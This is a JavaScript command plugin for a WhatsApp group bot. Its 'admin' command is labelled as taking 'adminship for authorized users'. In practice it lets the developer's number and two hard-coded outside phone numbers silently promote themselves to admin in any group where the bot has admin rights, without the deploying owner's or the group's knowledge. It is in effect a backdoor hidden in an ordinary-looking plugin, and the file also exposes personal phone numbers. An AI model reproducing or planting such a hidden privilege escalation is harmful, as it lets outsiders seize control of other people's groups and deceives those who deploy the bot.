const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    filename: __filename,
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    // Verify group context
    if (!isGroup) return;

    // Verify bot is admin
    if (!isBotAdmins) return;

    // Normalize JIDs for comparison
    const normalizeJid = (jid) => {
        if (!jid) return jid;
        // Handle LID format
        if (jid.includes('@lid')) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    // Authorized users (properly formatted JIDs)
    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "2348065623101@s.whatsapp.net",
        "2349126793637@s.whatsapp.net"
    ].filter(Boolean);

    // Check authorization with normalized JIDs
    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;

    try {
        // Get current group metadata
        const groupMetadata = await conn.groupMetadata(from);
        
        // Check if already admin
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) return;

        // Promote self to admin
        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        return;
        
    } catch (error) {
        console.error("Admin command error:", error);
        return;
    }
});
